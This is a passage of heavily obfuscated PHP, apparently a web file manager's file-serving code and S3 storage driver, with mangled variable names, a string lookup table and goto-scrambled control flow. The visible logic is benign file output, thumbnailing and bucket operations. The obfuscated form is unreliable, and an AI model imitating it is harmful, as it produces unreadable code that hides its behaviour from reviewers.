($f˜òÏ²¡…Â) { header($e×Œ§Ø°Ü[149] . $f˜òÏ²¡…Â); } return; } if (isset($_SERVER[$e×Œ§Ø°Ü[150]])) { if (preg_match($e×Œ§Ø°Ü[151], $_SERVER[$e×Œ§Ø°Ü[150]], $aØøŒ‰Â°Ğ)) { $cÅå÷ŒöÆ = intval($aØøŒ‰Â°Ğ[1]); if (!empty($aØøŒ‰Â°Ğ[2])) { $D–œ˜¿¦¯« = intval($aØøŒ‰Â°Ğ[2]); } } header($e×Œ§Ø°Ü[152]); header("\103\x6f\x6e\x74\x65\156\x74\x2d\122\141\156\147\145\x3a\x20\x62\171\x74\x65\163\40{$cÅå÷ŒöÆ}\55{$D–œ˜¿¦¯«}\x2f" . $AŞçÁê•¢ø); } else { header($e×Œ§Ø°Ü[153]); } goto d©îø¥‚ã£; eÍËæ¾ñõô: header($e×Œ§Ø°Ü[135] . $f–¦ ˜ÑÃ . $e×Œ§Ø°Ü[127]); header($e×Œ§Ø°Ü[136] . $e—ª¡¯Æ×Ê); header($e×Œ§Ø°Ü[137]); goto bñÊö×ŞÇŠ; eŒ©Á›æÃ: @ob_end_clean(); set_timeout(); $béïÓÊÈÏ = $this->infoFull($BïÇğ¶’ğš); goto FĞèä©›á; d©îø¥‚ã£: $d£…ù—„Œ = !0; if ($_SERVER[$e×Œ§Ø°Ü[154]] == $e×Œ§Ø°Ü[155] && $AŞçÁê•¢ø > 1204 * 1024 * 1024 * 2) { $d£…ù—„Œ = !1; } if ($d£…ù—„Œ) { header($e×Œ§Ø°Ü[156] . ($D–œ˜¿¦¯« - $cÅå÷ŒöÆ + 1)); } goto e…éİÒ¨; DÓ†“§ƒÊÌ: $cÅå÷ŒöÆ = 0; $D–œ˜¿¦¯« = $AŞçÁê•¢ø - 1; $b¬‘ä°²« = $this->ext($e—ª¡¯Æ×Ê); goto D óˆİö£; bñÊö×ŞÇŠ: header($e×Œ§Ø°Ü[138] . $AŞçÁê•¢ø); header($e×Œ§Ø°Ü[139]); if (!$FÜ­¿Õ§ && $b¬‘ä°²« == $e×Œ§Ø°Ü[140]) { if ($AŞçÁê•¢ø > 1024 * 1024 * 5) { die; } $eÄÔÒÛÒ¾® = $this->getContent($BïÇğ¶’ğš); $eÄÔÒÛÒ¾® = Html::clearSVG($eÄÔÒÛÒ¾®); header($e×Œ§Ø°Ü[141] . strlen($eÄÔÒÛÒ¾®)); echo $eÄÔÒÛÒ¾®; die; } goto DğæçŒá†; B„°†Ôœ: $e×Œ§Ø°Ü =& $_SERVER[œº]; $this->cacheMethod(null, null); if (!$BïÇğ¶’ğš || !$this->exist($BïÇğ¶’ğš)) { show_json(LNG($e×Œ§Ø°Ü[105]), !1, $câÓñ´ÄÁï); } goto Aºë„øêè; e…éİÒ¨: if ($_SERVER[$e×Œ§Ø°Ü[157]] == $e×Œ§Ø°Ü[158]) { return; } $fƒ•î¦•ì÷ = 1024 * 100; $bµ´È¡ÆŠÄ = 0; goto bÑã’ÏëĞß; DÚ‡¨„º“‘: if (isset($_SERVER[$e×Œ§Ø°Ü[131]]) && strtotime($_SERVER[$e×Œ§Ø°Ü[131]]) == $béïÓÊÈÏ[$e×Œ§Ø°Ü[84]]) { header($e×Œ§Ø°Ü[132], !0, 304); die; } if (isset($_SERVER[$e×Œ§Ø°Ü[133]]) && $_SERVER[$e×Œ§Ø°Ü[133]] == $D¨Ûõ¼±ˆ†) { header($e×Œ§Ø°Ü[134] . $D¨Ûõ¼±ˆ†, !0, 304); die; } header($e×Œ§Ø°Ü[134] . $D¨Ûõ¼±ˆ†); goto eÍËæ¾ñõô; cÚ…òô´ß‰: header($e×Œ§Ø°Ü[120]); header($e×Œ§Ø°Ü[121] . $bÁôšœÁœ«); $AìÊùÎ–œ± = rawurlencode($e—ª¡¯Æ×Ê); goto fÍ‚­¢ìóô; BÂÊ Ü½Ùõ: } public function fileOutServer($b§ÁÔ¡ôÖ†, $C’¦¼Ã¥Õ = false, $eÖ—Ûâœ—Â = false, $Càğ…Ç ß– = '') { $this->fileOut($b§ÁÔ¡ôÖ†, $C’¦¼Ã¥Õ, $eÖ—Ûâœ—Â, $Càğ…Ç ß–); } public function fileOutLink($EÑÛÄ¥Ûñ) { header($_SERVER[œº][159] . $EÑÛÄ¥Ûñ); die; } public function cacheMethod($Aé÷çÒê², $C×ˆˆØÉù¤, $fÎ™¸Ÿò = null) { goto b™À¢°¨µ; EÒÕÜÌ»ã£: $BÆË˜Ğ²ÈÍ = $this->{$Aé÷çÒê²}($C×ˆˆØÉù¤); $E—‚ˆí³¹[$Aßª­‚ÅØ] = $BÆË˜Ğ²ÈÍ; return $BÆË˜Ğ²ÈÍ; goto AÉõ”ˆŒ; b™À¢°¨µ: $AéŸÀÒ†–ö =& $_SERVER[œº]; static $E—‚ˆí³¹ = array(); $eİÁ†İâñ = $C×ˆˆØÉù¤ ? ltrim($this->getPathOuter($C×ˆˆØÉù¤), $AéŸÀÒ†–ö[8]) : $C×ˆˆØÉù¤; goto C»îå›¢ïÚ; bà§ØÃÅÄö: if (!is_null($fÎ™¸Ÿò)) { $E—‚ˆí³¹[$Aßª­‚ÅØ] = $fÎ™¸Ÿò; return; } $BÆË˜Ğ²ÈÍ = isset($E—‚ˆí³¹[$Aßª­‚ÅØ]) ? $E—‚ˆí³¹[$Aßª­‚ÅØ] : null; if (!is_null($BÆË˜Ğ²ÈÍ)) { return $BÆË˜Ğ²ÈÍ; } goto EÒÕÜÌ»ã£; C»îå›¢ïÚ: $Aßª­‚ÅØ = $AéŸÀÒ†–ö[160] . $Aé÷çÒê² . $AéŸÀÒ†–ö[161] . rtrim($eİÁ†İâñ, $AéŸÀÒ†–ö[8]); if (is_null($Aé÷çÒê²)) { $E—‚ˆí³¹ = array(); return; } if (is_null($C×ˆˆØÉù¤)) { unset($E—‚ˆí³¹[$Aßª­‚ÅØ]); return; } goto bà§ØÃÅÄö; AÉõ”ˆŒ: } public function fileOutImage($A­ÍÇ¯“íØ, $DàÆê†¬ËÍ = 250) { goto eø•ƒœŞã±; fßŠØä¶‘: if (!@file_exists($F«…¾ÕÇÚ‹)) { $bÈ¼‚íŸÁ® = TEMP_FILES; if (!is_dir($bÈ¼‚íŸÁ®)) { mk_dir($bÈ¼‚íŸÁ®); } $bµ¬ªô¿ˆï = $bÈ¼‚íŸÁ® . $b…±İÊË . $aÎéµ¹»»ç[95] . $bàê§øÅ’Œ[$aÎéµ¹»»ç[168]]; if (!@file_exists($bµ¬ªô¿ˆï)) { $bµ¬ªô¿ˆï = $this->download($A­ÍÇ¯“íØ, $bµ¬ªô¿ˆï); } ImageThumb::createThumb($bµ¬ªô¿ˆï, $F«…¾ÕÇÚ‹, $DàÆê†¬ËÍ, $DàÆê†¬ËÍ * 10); } if (!file_exists($F«…¾ÕÇÚ‹) || filesize($F«…¾ÕÇÚ‹) < 100) { return @file_exists($bµ¬ªô¿ˆï) ? IO::fileOut($bµ¬ªô¿ˆï) : $this->fileOut($A­ÍÇ¯“íØ); } if (!($eÓö¥‡· = IO::move($F«…¾ÕÇÚ‹, $eÄÕê°”ÕŒ))) { return IO::fileOut($F«…¾ÕÇÚ‹); } goto A™Ş¤Á÷áĞ; FÏÜÈ²ïÑé: if (isset($GLOBALS[$aÎéµ¹»»ç[162]]) && $GLOBALS[$aÎéµ¹»»ç[162]][$aÎéµ¹»»ç[76]] == $bàê§øÅ’Œ[$aÎéµ¹»»ç[76]]) { $eŒ½Ã™©•¶ = $GLOBALS[$aÎéµ¹»»ç[162]][$aÎéµ¹»»ç[163]]; if (!$bàê§øÅ’Œ[$aÎéµ¹»»ç[164]]) { $bàê§øÅ’Œ[$aÎéµ¹»»ç[164]] = $GLOBALS[$aÎéµ¹»»ç[162]]; } if (isset($eŒ½Ã™©•¶[$aÎéµ¹»»ç[165]])) { if ($eŒ½Ã™©•¶[$aÎéµ¹»»ç[165]] <= $DàÆê†¬ËÍ && $eŒ½Ã™©•¶[$aÎéµ¹»»ç[166]] <= $DàÆê†¬ËÍ) { $BÈÙ±¸ŠîÏ = !0; } } $c³Â¨«Á¸Ù = $bàê§øÅ’Œ[$aÎéµ¹»»ç[164]][$aÎéµ¹»»ç[28]]; } if ($bàê§øÅ’Œ[$aÎéµ¹»»ç[78]] <= 1024 * 50 || $BÈÙ±¸ŠîÏ || !function_exists($aÎéµ¹»»ç[167]) || $bàê§øÅ’Œ[$aÎéµ¹»»ç[168]] == $aÎéµ¹»»ç[169]) { return $this->fileOut($A­ÍÇ¯“íØ, !1, $c³Â¨«Á¸Ù); } if (isset($bàê§øÅ’Œ[$aÎéµ¹»»ç[164]][$aÎéµ¹»»ç[170]])) { $b…±İÊË = $bàê§øÅ’Œ[$aÎéµ¹»»ç[164]][$aÎéµ¹»»ç[170]]; } else { if (isset($bàê§øÅ’Œ[$aÎéµ¹»»ç[164]][$aÎéµ¹»»ç[171]])) { $b…±İÊË = $bàê§øÅ’Œ[$aÎéµ¹»»ç[164]][$aÎéµ¹»»ç[171]]; } else { $b…±İÊË = md5("{$bàê§øÅ’Œ[$aÎéµ¹»»ç[28]]}\137{$bàê§øÅ’Œ[$aÎéµ¹»»ç[76]]}\x5f{$bàê§øÅ’Œ[$aÎéµ¹»»ç[78]]}"); } } goto fŸ¸¬¦ß½¨; A™Ş¤Á÷áĞ: del_file($F«…¾ÕÇÚ‹); IO::fileOut($eÓö¥‡·); goto c£¾ƒº¡…‹; eø•ƒœŞã±: $aÎéµ¹»»ç =& $_SERVER[œº]; set_timeout(); if (substr($A­ÍÇ¯“íØ, 0, 4) == $aÎéµ¹»»ç[147]) { $this->fileOutLink($A­ÍÇ¯“íØ); } goto d—¸ÜË†³ñ; fŸ¸¬¦ß½¨: $AÚé¨ÃŒŒÇ = "{$b…±İÊË}\x5f{$DàÆê†¬ËÍ}\56\x70\156\x67"; if (!($cÆÍç–‰ÃÔ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $aÎéµ¹»»ç[172]))) { $eÄÕê°”ÕŒ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $aÎéµ¹»»ç[173]); } else { $eÄÕê°”ÕŒ = KodIO::make($cÆÍç–‰ÃÔ); } if ($cÆÍç–‰ÃÔ = IO::fileNameExist($eÄÕê°”ÕŒ, $AÚé¨ÃŒŒÇ)) { $F«…¾ÕÇÚ‹ = KodIO::make($cÆÍç–‰ÃÔ); return IO::fileOut($F«…¾ÕÇÚ‹, !1, $c³Â¨«Á¸Ù); } goto E¾¶‚´—©»; E¾¶‚´—©»: if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $F«…¾ÕÇÚ‹ = DATA_THUMB . $AÚé¨ÃŒŒÇ; del_file($F«…¾ÕÇÚ‹); goto fßŠØä¶‘; d—¸ÜË†³ñ: $bàê§øÅ’Œ = $this->info($A­ÍÇ¯“íØ); $c³Â¨«Á¸Ù = $bàê§øÅ’Œ[$aÎéµ¹»»ç[28]]; $BÈÙ±¸ŠîÏ = !1; goto FÏÜÈ²ïÑé; c£¾ƒº¡…‹: } public function fileOutImageServer($b™ÎĞÕ·ñ‚, $e–ÄîÓŠª = 250) { $this->fileOutImage($b™ÎĞÕ·ñ‚, $e–ÄîÓŠª); } public function fileNameAuto($B˜…Â«ø¾Ô, $E”ãğ, $cùó·òù = REPEAT_RENAME, $C¢…·¶…ëŸ = false) { goto E«®–èï; D±–‚µù¯: if ($cùó·òù == REPEAT_SKIP) { return !1; } $D¿’Ğ†£ = $f–ÓÏ„¤è[95] . get_path_ext($E”ãğ); $D¿’Ğ†£ = $D¿’Ğ†£ == $f–ÓÏ„¤è[95] || $C¢…·¶…ëŸ ? $f–ÓÏ„¤è[33] : $D¿’Ğ†£; goto bÁ»¬Íª×¾; E«®–èï: $f–ÓÏ„¤è =& $_SERVER[œº]; $A­¤¶ø°ã¬ = $B˜…Â«ø¾Ô === $f–ÓÏ„¤è[33] ? $E”ãğ : rtrim($B˜…Â«ø¾Ô, $f–ÓÏ„¤è[8]) . $f–ÓÏ„¤è[8] . $E”ãğ; if ($cùó·òù == REPEAT_REPLACE || !$this->exist($A­¤¶ø°ã¬) || $C¢…·¶…ëŸ && $cùó·òù != REPEAT_RENAME_FOLDER) { return $E”ãğ; } goto D±–‚µù¯; bÁ»¬Íª×¾: $D·±ÒÅ‘·‡ = 1; $BˆÓÃ‘‰Ş = substr($E”ãğ, 0, strlen($E”ãğ) - strlen($D¿’Ğ†£)); $Fğ©½ˆ¢ÍÅ = $BˆÓÃ‘‰Ş . "\x28{$D·±ÒÅ‘·‡}\51{$D¿’Ğ†£}"; goto dÜ¼ôİëĞê; dÜ¼ôİëĞê: while ($this->exist(rtrim($B˜…Â«ø¾Ô, $f–ÓÏ„¤è[8]) . $f–ÓÏ„¤è[8] . $Fğ©½ˆ¢ÍÅ)) { $Fğ©½ˆ¢ÍÅ = $BˆÓÃ‘‰Ş . "\x28{$D·±ÒÅ‘·‡}\51{$D¿’Ğ†£}"; $D·±ÒÅ‘·‡++; } return $Fğ©½ˆ¢ÍÅ; goto d­ÌëÃ Ñ; d­ÌëÃ Ñ: } private function fileNameAutoList($d‰·•Ò†âã, $DöÍğåà’÷, $b–ØÏ‰Åô… = false) { goto BîÍÀÌË²Ÿ; EÔ©ØÚ¦Âö: return $d²Ï‹‰‘ò±; goto B¥ªÊ–±‡; C†ÖØÕ¤„¨: $E¶†••’å = substr($DöÍğåà’÷, 0, strlen($DöÍğåà’÷) - strlen($Bì¢¶‰¨¼—)); $d²Ï‹‰‘ò± = $E¶†••’å . "\x28\60\x29{$Bì¢¶‰¨¼—}"; for ($f‘™†¿Ì‡“ = 1; $f‘™†¿Ì‡“ <= count($a©£ÊĞšäË) + 1; $f‘™†¿Ì‡“++) { $d²Ï‹‰‘ò± = $E¶†••’å . "\50{$f‘™†¿Ì‡“}\51{$Bì¢¶‰¨¼—}"; if (!in_array_not_case($d²Ï‹‰‘ò±, $a©£ÊĞšäË)) { return $d²Ï‹‰‘ò±; } } goto EÔ©ØÚ¦Âö; BîÍÀÌË²Ÿ: $C§††Ãß•¯ =& $_SERVER[œº]; $dùÈù¨º™Ø = $this->listPath($d‰·•Ò†âã, !0); $dùÈù¨º™Ø = array_merge($dùÈù¨º™Ø[$C§††Ãß•¯[75]], $dùÈù¨º™Ø[$C§††Ãß•¯[74]]); goto fê…Òêˆ£; fê…Òêˆ£: $a©£ÊĞšäË = array_to_keyvalue($dùÈù¨º™Ø, $C§††Ãß•¯[33], $C§††Ãß•¯[28]); $Bì¢¶‰¨¼— = $C§††Ãß•¯[95] . get_path_ext($DöÍğåà’÷); $Bì¢¶‰¨¼— = $Bì¢¶‰¨¼— == $C§††Ãß•¯[95] || $b–ØÏ‰Åô… ? $C§††Ãß•¯[33] : $Bì¢¶‰¨¼—; goto C†ÖØÕ¤„¨; B¥ªÊ–±‡: } public function listAllFiles($a•ŒØÍ…ª, $a£è£Õ’­, $FÖ‰ôİ‡©ñ = array()) { goto e¾˜ ßÚÍ; AóÖ™†ô×‘: $a•ŒØÍ…ª = trim($a•ŒØÍ…ª, $díÚÀè¶äî[8]); foreach ($a£è£Õ’­ as $b·ò¼Ã½ò) { $BÏí—¿šë¸ = ltrim(substr(trim($b·ò¼Ã½ò, $díÚÀè¶äî[8]), strlen($a•ŒØÍ…ª)), $díÚÀè¶äî[8]); $fÆ“Õ˜¢™´ = array_merge($fÆ“Õ˜¢™´, $this->slicePath($BÏí—¿šë¸)); } $eøÖÁ¥‚ì¡ = array(); goto eš˜¡·©‘; e¾˜ ßÚÍ: $díÚÀè¶äî =& $_SERVER[œº]; if (empty($a£è£Õ’­)) { return array(); } $fÆ“Õ˜¢™´ = array(); goto AóÖ™†ô×‘; eš˜¡·©‘: foreach (array_unique($fÆ“Õ˜¢™´) as $b·ò¼Ã½ò) { $B÷ˆ‡ê¥Îš = array($díÚÀè¶äî[76] => $this->getPathOuter($díÚÀè¶äî[8] . $a•ŒØÍ…ª . $díÚÀè¶äî[8] . $b·ò¼Ã½ò), $díÚÀè¶äî[77] => 1, $díÚÀè¶äî[78] => 0); if (substr($b·ò¼Ã½ò, -1) != $díÚÀè¶äî[8]) { $B÷ˆ‡ê¥Îš[$díÚÀè¶äî[77]] = 0; $E¿¿Á²ÒõÙ = $this->getPath($a•ŒØÍ…ª . $díÚÀè¶äî[8] . $b·ò¼Ã½ò); $B÷ˆ‡ê¥Îš[$díÚÀè¶äî[78]] = isset($FÖ‰ôİ‡©ñ[$E¿¿Á²ÒõÙ]) ? $FÖ‰ôİ‡©ñ[$E¿¿Á²ÒõÙ] : $this->size($E¿¿Á²ÒõÙ); } $eøÖÁ¥‚ì¡[] = $B÷ˆ‡ê¥Îš; } return $eøÖÁ¥‚ì¡; goto C†ö†¸´®ƒ; C†ö†¸´®ƒ: } public function slicePath($b•ø«Ø­›Ã) { $BÛõ˜ç­ëØ =& $_SERVER[œº]; $a…›†âÂìƒ = explode($BÛõ˜ç­ëØ[8], trim($b•ø«Ø­›Ã, $BÛõ˜ç­ëØ[8])); $E¢Ôò¨Óºå = 0; do { ++$E¢Ôò¨Óºå; $cÜÎ‡Œİ‡Ê[] = implode($BÛõ˜ç­ëØ[8], array_slice($a…›†âÂìƒ, 0, $E¢Ôò¨Óºå)) . $BÛõ˜ç­ëØ[8]; } while ($E¢Ôò¨Óºå < count($a…›†âÂìƒ)); $cÜÎ‡Œİ‡Ê[count($a…›†âÂìƒ) - 1] = $b•ø«Ø­›Ã; return $cÜÎ‡Œİ‡Ê; } public function getHost() { $D·ÅÙš„øË =& $_SERVER[œº]; $bòøÁ¹‹ = parse_url(trim($this->domain, $D·ÅÙš„øË[8])); $FŒï²Æ£¦ = isset($bòøÁ¹‹[$D·ÅÙš„øË[174]]) ? $bòøÁ¹‹[$D·ÅÙš„øË[174]] : http_type(); $Aãôø­èµë = isset($bòøÁ¹‹[$D·ÅÙš„øË[175]]) ? $bòøÁ¹‹[$D·ÅÙš„øË[175]] : $bòøÁ¹‹[$D·ÅÙš„øË[76]]; if (isset($bòøÁ¹‹[$D·ÅÙš„øË[176]])) { $Aãôø­èµë .= $D·ÅÙš„øË[4] . $bòøÁ¹‹[$D·ÅÙš„øË[176]]; } return $FŒï²Æ£¦ . $D·ÅÙš„øË[177] . $Aãôø­èµë; } public function pathEncode($fÕ‹õ“¸¡‚) { $FÎ”îàâ²» =& $_SERVER[œº]; return str_replace($FÎ”îàâ²»[178], $FÎ”îàâ²»[8], rawurlencode($fÕ‹õ“¸¡‚)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($AÅ¬Ş–Û¢ç) { set_timeout(); require_once SDK_DIR . $_SERVER[œº][179]; parent::__construct(); $this->_init($AÅ¬Ş–Û¢ç); } public function _init($c¥ªïÔ¸¡Â) { foreach ($c¥ªïÔ¸¡Â as $bœÓîŠ–¼É => $dÖ¶İ˜Şñ¡) { if (isset($this->{$bœÓîŠ–¼É})) { $this->{$bœÓîŠ–¼É} = $dÖ¶İ˜Şñ¡; } } $this->endpoint = $c¥ªïÔ¸¡Â[$_SERVER[œº][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($eğàÈØ‹ŠÙ = "\166\x34") { $this->signVer = $eğàÈØ‹ŠÙ; $this->client->setSignatureVersion($eğàÈØ‹ŠÙ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto EÖÇ· Ä·ö; EÖÇ· Ä·ö: $E–Š– âÃ… =& $_SERVER[œº]; $d½ïÔ‹‡Í = $this->getBucketCors(); if (!$d½ïÔ‹‡Í || !is_array($d½ïÔ‹‡Í)) { return !1; } goto dÆ˜å¥…Õ; bò‚Ö¤: $D»·–² ‰È = array($E–Š– âÃ…[186], $E–Š– âÃ…[187], $E–Š– âÃ…[188], $E–Š– âÃ…[189], $E–Š– âÃ…[190]); $CàßËôÑ Å = array_diff($D»·–² ‰È, $B†§§¤ÛÆĞ); return empty($CàßËôÑ Å); goto fƒİßÌ­ù; dÆ˜å¥…Õ: if ($d½ïÔ‹‡Í[$E–Š– âÃ…[181]] != $E–Š– âÃ…[182] || $d½ïÔ‹‡Í[$E–Š– âÃ…[183]] != $E–Š– âÃ…[182]) { return !1; } $B†§§¤ÛÆĞ = array_map($E–Š– âÃ…[184], $d½ïÔ‹‡Í[$E–Š– âÃ…[185]]); if (!is_array($B†§§¤ÛÆĞ)) { $B†§§¤ÛÆĞ = array(); } goto bò‚Ö¤; fƒİßÌ­ù: } public function mkfile($fÄŞÔáÔ¿…, $c²ŒõèÅİ­ = '', $fà„‚‹®›Ê = REPEAT_RENAME) { $a‘ôÎ­«÷Ğ = $this->setContent($fÄŞÔáÔ¿…, $c²ŒõèÅİ­); if ($a‘ôÎ­«÷Ğ !== !1) { return $this->getPathOuter($fÄŞÔáÔ¿…); } return !1; } public function mkdir($Fê›ë¸¬Š, $F±ˆ¹ÅãÈó = REPEAT_SKIP) { $cëãÈ–Ì†« =& $_SERVER[œº]; if (empty($Fê›ë¸¬Š) && $Fê›ë¸¬Š !== $cëãÈ–Ì†«[191]) { return !1; } if ($this->_isFolder($Fê›ë¸¬Š)) { return $this->getPathOuter($Fê›ë¸¬Š); } $a§ƒÚ¶´Öİ = $this->setContent($Fê›ë¸¬Š, $cëãÈ–Ì†«[33], !0); if ($a§ƒÚ¶´Öİ !== !1) { return $this->getPathOuter($Fê›ë¸¬Š); } return !1; } public function copyFile($C‡¥‰Ï¯ØÑ, $Eìã™˜˜Ÿ, $bæ§ù¥Ñõß = array()) { $EØÛÊçÈƒÒ =& $_SERVER[œº]; $EÕœ¸……‡Å = $this->objectMeta($C‡¥‰Ï¯ØÑ); if (!$EÕœ¸……‡Å) { return !1; } if ($EÕœ¸……‡Å[$EØÛÊçÈƒÒ[78]] <= 1024 * 1024 * 200) { $CÛÃ£ÔÕó = $this->client->copyObject($this->bucket, $C‡¥‰Ï¯ØÑ, $this->bucket, $Eìã™˜˜Ÿ, $EØÛÊçÈƒÒ[192], $bæ§ù¥Ñõß); } else { $CÛÃ£ÔÕó = $this->client->multiCopyObject($this->bucket, $C‡¥‰Ï¯ØÑ, $this->bucket, $Eìã™˜˜Ÿ, $bæ§ù¥Ñõß); } $CÛÃ£ÔÕó = $CÛÃ£ÔÕó ? $this->getPathOuter($Eìã™˜˜Ÿ) : !1; return $CÛÃ£ÔÕó; } public function moveFile($dÁë´¢’¤Ä, $Eõ¶Á•Ññ½) { if ($this->copyFile($dÁë´¢’¤Ä, $Eõ¶Á•Ññ½)) { $this->delFile($dÁë´¢’¤Ä); return $this->getPathOuter($Eõ¶Á•Ññ½); } return !1; } public function delFile($Bó¼‰Öï¢Ã) { return $this->client->deleteObject($this->bucket, $Bó¼‰Öï¢Ã); } public function delFolder($AÕÆĞİ¼·) { goto a¥ĞŠŒäâ; D†±†®Ä‘: $AñÅàÃÇ‚ = $this->fileList($AÕÆĞİ¼·); $this->listItemCache = !0; $AºöÍñóÒ = trim($AÕÆĞİ¼·, $D£ØïÖòà[8]) . $D£ØïÖòà[8]; goto a¬‘¯À¤ä¨; a¬‘¯À¤ä¨: if (!empty($AÕÆĞİ¼·) && $AÕÆĞİ¼· !== $D£ØïÖòà[191] && !in_array($AºöÍñóÒ, $AñÅàÃÇ‚[$D£ØïÖòà[75]])) { $AñÅàÃÇ‚[$D£ØïÖòà[75]][] = $AºöÍñóÒ; } $f¯÷ø½‡ª = $this->delByBatch($AñÅàÃÇ‚[$D£ØïÖòà[74]]); if (!$f¯÷ø½‡ª) { return !1; } goto Aß­ğëö¹½; a¥ĞŠŒäâ: $D£ØïÖòà =& $_SERVER[œº]; if (!$this->exist($AÕÆĞİ¼·)) { return !0; } $this->listItemCache = !1; goto D†±†®Ä‘; Aß­ğëö¹½: $f¯÷ø½‡ª = $this->delByBatch($AñÅàÃÇ‚[$D£ØïÖòà[75]]); if (!$f¯÷ø½‡ª) { return !1; } return $this->delFile($AºöÍñóÒ); goto B¹çÎÀÛÃ; B¹çÎÀÛÃ: } private function delByBatch($dí˜°¬ÑÚŠ) { foreach (array_chunk($dí˜°¬ÑÚŠ, 1000) as $BÃî‹ã–«Ò) { $CØ˜Ï·Á§’ = $this->client->deleteObjects($this->bucket, $BÃî‹ã–«Ò); if (!$CØ˜Ï·Á§’) { return !1; } } return !0; } public function rename($Bø×½öéöÑ, $A¨ŸŠ§«Ãñ) { return $this->renameObject($Bø×½öéöÑ, $A¨ŸŠ§«Ãñ); } public function listPath($a·»ØÕÚœ, $eÏÆâ¦ÚÁº = false) { $B‚ àÖ¯äÖ =& $_SERVER[œº]; $b×È±—ŸõÆ = $this->fileList($a·»ØÕÚœ, $B‚ àÖ¯äÖ[8], !0); foreach ($b×È±—ŸõÆ[$B‚ àÖ¯äÖ[75]] as $dˆ›ªàÀŠ => $c¿ÌÁ–ÀÃ) { $b×È±—ŸõÆ[$B‚ àÖ¯äÖ[75]][$dˆ›ªàÀŠ] = $this->folderInfo($c¿ÌÁ–ÀÃ, $eÏÆâ¦ÚÁº); } foreach ($b×È±—ŸõÆ[$B‚ àÖ¯äÖ[74]] as $dˆ›ªàÀŠ => $c¿ÌÁ–ÀÃ) { $b×È±—ŸõÆ[$B‚ àÖ¯äÖ[74]][$dˆ›ªàÀŠ] = $this->fileInfo($c¿ÌÁ–ÀÃ[$B‚ àÖ¯äÖ[28]], $eÏÆâ¦ÚÁº, $c¿ÌÁ–ÀÃ); } return $b×È±—ŸõÆ; } private function fileInfo($EåÚò™¸­, $dÁÒãø’ÈØ = false, $dâİáÉÜ‰ = array()) { goto FœÏ‘â™“ˆ; FœÏ‘â™“ˆ: $dÜ ˆºëàÓ =& $_SERVER[œº]; $Dç¦İ½ÙƒŸ = array($dÜ ˆºëàÓ[28] => $this->pathThis($EåÚò™¸­), $dÜ ˆºëàÓ[76] => $this->getPathOuter($EåÚò™¸­), $dÜ ˆºëàÓ[29] => $dÜ ˆºëàÓ[193], $dÜ ˆºëàÓ[168] => $this->ext($EåÚò™¸­), $dÜ ˆºëàÓ[78] => isset($dâİáÉÜ‰[$dÜ ˆºëàÓ[78]]) ? $dâİáÉÜ‰[$dÜ ˆºëàÓ[78]] : 0); if ($dÁÒãø’ÈØ) { return $Dç¦İ½ÙƒŸ; } goto B´ĞÚÛ­µ‡; c‘¬Š‡½ˆ³: if (isset($dâİáÉÜ‰[$dÜ ˆºëàÓ[197]])) { $Dç¦İ½ÙƒŸ[$dÜ ˆºëàÓ[84]] = $dâİáÉÜ‰[$dÜ ˆºëàÓ[197]]; } if (isset($dâİáÉÜ‰[$dÜ ˆºëàÓ[78]])) { $Dç¦İ½ÙƒŸ[$dÜ ˆºëàÓ[78]] = $dâİáÉÜ‰[$dÜ ˆºëàÓ[78]]; } return $Dç¦İ½ÙƒŸ; goto cÂ¥¦Û„‘“; B´ĞÚÛ­µ‡: $Dç¦İ½ÙƒŸ[$dÜ ˆºëàÓ[194]] = $Dç¦İ½ÙƒŸ[$dÜ ˆºëàÓ[84]] = 0; $Dç¦İ½ÙƒŸ[$dÜ ˆºëàÓ[195]] = $Dç¦İ½ÙƒŸ[$dÜ ˆºëàÓ[196]] = !0; if (empty($dâİáÉÜ‰)) { $dâİáÉÜ‰ = $this->objectMeta($EåÚò™¸­); if (!$dâİáÉÜ‰) { return $Dç¦İ½ÙƒŸ; } } goto c‘¬Š‡½ˆ³; cÂ¥¦Û„‘“: } private function folderInfo($F­¡¶ºñÓ, $c¸¶ˆ¯Üäò = false) { goto Fƒù¹Ğ™¡; Ağ‰†”ÅÍè: return $fŠõÌˆï¥½; goto C‚ôÚÉ†Û; Fƒù¹Ğ™¡: $Bğáø¬£³œ =& $_SERVER[œº]; $fŠõÌˆï¥½ = array($Bğáø¬£³œ[28] => $this->pathThis($F­¡¶ºñÓ), $Bğáø¬£³œ[76] => $this->getPathOuter($Bğáø¬£³œ[8] . $F­¡¶ºñÓ), $Bğáø¬£³œ[29] => $Bğáø¬£³œ[77]); if ($c¸¶ˆ¯Üäò) { return $fŠõÌˆï¥½; } goto A¨Ë±ÈÜ¶”; A¨Ë±ÈÜ¶”: $fŠõÌˆï¥½[$Bğáø¬£³œ[194]] = $fŠõÌˆï¥½[$Bğáø¬£³œ[84]] = 0; $fŠõÌˆï¥½[$Bğáø¬£³œ[195]] = $fŠõÌˆï¥½[$Bğáø¬£³œ[196]] = !0; if ($F­¡¶ºñÓ == $Bğáø¬£³œ[33]) { return $fŠõÌˆï¥½; } goto e¬¥¸‰ÎË“; e¬¥¸‰ÎË“: $F­¡¶ºñÓ = trim($F­¡¶ºñÓ, $Bğáø¬£³œ[8]) . $Bğáø¬£³œ[8]; $Fïå›İåèì = $this->objectMeta($F­¡¶ºñÓ); if (isset($Fïå›İåèì[$Bğáø¬£³œ[197]])) { $fŠõÌˆï¥½[$Bğáø¬£³œ[194]] = $Fïå›İåèì[$Bğáø¬£³œ[197]]; } goto Ağ‰†”ÅÍè; C‚ôÚÉ†Û: } private function fileList($a‘…¨šÒ½‰, $D©å„¿ƒéï = '', $A‚½é±‘£í = 0) { goto bÏ„İÂÖ…ô; a²·ïÈç˜—: foreach ($F¶¸ì•Ö¶[$AÅ´Åğ««[198]] as $Aõê¤àÜÉ“) { goto Fø‡¯§çñ; báÎë¿ª›ë: $c¥¹ìÄöêã = $d÷ë‘¶ª == 0 && substr($D©×…ñè¥±, 